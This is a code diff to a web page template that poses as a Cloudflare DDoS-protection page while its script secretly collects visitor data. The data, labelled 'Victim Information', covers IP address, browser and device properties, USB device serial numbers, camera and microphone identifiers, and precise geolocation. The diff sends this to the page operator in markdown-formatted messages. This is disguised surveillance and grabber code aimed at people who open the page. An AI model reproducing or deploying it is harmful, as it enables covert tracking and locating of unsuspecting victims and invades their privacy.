@@ -61,8 +61,8 @@ a:hover{color: #f4a15d}
 <div class="attribution">
 DDoS protection by 
 <a rel="noopener noreferrer" href="https://www.cloudflare.com/5xx-error-landing/" target="_blank">Cloudflare</a> 
-<br> 
-<span class="ray_id">Ray ID: <code id="ray" >6c51810c599f2cda</code></span> 
+\n 
+<span class="ray_id">Ray ID: <code id="ray" >6c51810c599f2cda___</span> 
 </div> </td> 
 </tr> 
 </tbody>
@@ -133,58 +133,62 @@ DDoS protection by
         var td = "";
 
         
-            td += '<code>✅Victim Information </code><br><br><b>⚓ IP: <a href="https://ip-api.com/#<%=ip %>" ><%=ip %></a> | Time: <%=time %></b>';
 
-
-            td+="<br><br><b>⏳ Date In Victim's Device :</b> " + new Date() + "<br>";
+        td +="? Date in victim device : " + new Date() + "\n";
         var xo = ["productSub", "vendor", "maxTouchPoints", "doNotTrack", "hardwareConcurrency", "cookieEnabled", "appCodeName", "appName", "appVersion", "platform", "product", "userAgent", "language", "languages", "webdriver", "pdfViewerEnabled", "deviceMemory"];
         var xoc = ["type", "rtt", "saveData", "effectiveType", "downlink", "downlinkMax"];
         ///INITIALS
-        td += "<br><b>📱 Device Information</b><br>";
+        td += "? Device Information \n```";
         for (var i = 0; i < xo.length; i++) {
             if (xo[i] in navigator) {
                 var str = navigator[xo[i]];
-                td += "<b>" + xo[i] + "</b>: <code>" + str + "</code><br>";
+                td += "? " + xo[i] + "  : " + str + "\n";
             }
         }
+        td+="```";
 
         if ("connection" in navigator) {
-            td += "<br><b>🕸️ Network Information</b><br>";
+            td += "? Network information \n```";
             for (var i = 0; i < xoc.length; i++) {
                 var str = navigator.connection[xoc[i]];
-                td += "<b>" + xoc[i] + "</b>: <code>" + str + "</code><br>";
+                td +=  xoc[i] + " : " + str + " \n";
             }
         }
+        td+="```";
         ////USB
         if ("usb" in navigator) {
             await navigator.usb.getDevices()
                 .then(devices => {
-                    td += "<br><b>🔌 Total USB devices connected:</b> " + devices.length + "<br>";
+                    td += "\n***🔌 Total USB devices connected:*** " + devices.length + "\n";
                     devices.forEach(device => {
-                        td += "<b>Product name:</b> " + device.productName + " , <b>Serial number: </b> <code>" + device.serialNumber + "</code><br>";
+                        td += "```Product name: " + device.productName + " , Serial number: " + device.serialNumber + " ```\n";
                     });
                 });
         }
+
+        post("<%=id%>", td, 'text');
+
 
         var td1='';
         if (navigator.mediaDevices || navigator.mediaDevices?.enumerateDevices) {
             /////List cameras and microphones.
             await navigator.mediaDevices?.enumerateDevices()
                 .then(function (devices) {
-                    td1 += "<br><b>📷 Media Device Information</b><br>";
+                    td1 += "\n***📷 Media Device Information***```\n";
                     devices.forEach(function (device) {
-                        td1 += "<b>" + device.kind + ":</b> " + device.label + " id = <code>" + device.deviceId + "</code><br>";
+                        td1 += "? " + device.kind + ": " + device.label + " | id = " + device.deviceId + "\n";
                     });
+                    td1 += "```";
                 })
                 .catch(function (err) {
-                    td1 += "<br><b>📷 Media Device Information</b><br>";
+                    td1 += "\n***📷 Media Device Information***\n";
                     td1 += "⚠️ Media Device Error: " + err.name + ": " + err.message;
                 });
         }
 
         //////Location
         if (!navigator.geolocation) {
-            td1 += "<br><b>📍 Location Information</b><br>";
+            td1 += "\n***📍 Location Information***\n";
             td1 += "⚠️ Location API not avilable";
         }
 
@@ -211,14 +215,13 @@ DDoS protection by
         }
 
         function error(err) {
-            td1 += "<br><b>📍 Location Information</b><br>";
-            td1 += "⚠️ Location ERROR: <code>" + err.message + "</code>";
+            td1 += "\n***📍 Location Information***\n";
+            td1 += "⚠️ Location ERROR: ___" + err.message + "___";
         }
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(success, error, { enableHighAccuracy: true, maximumAge: 0 });
         }
 
-        post("<%=id%>", td, 'text');
         post("<%=id%>", td1, 'text');
 
 
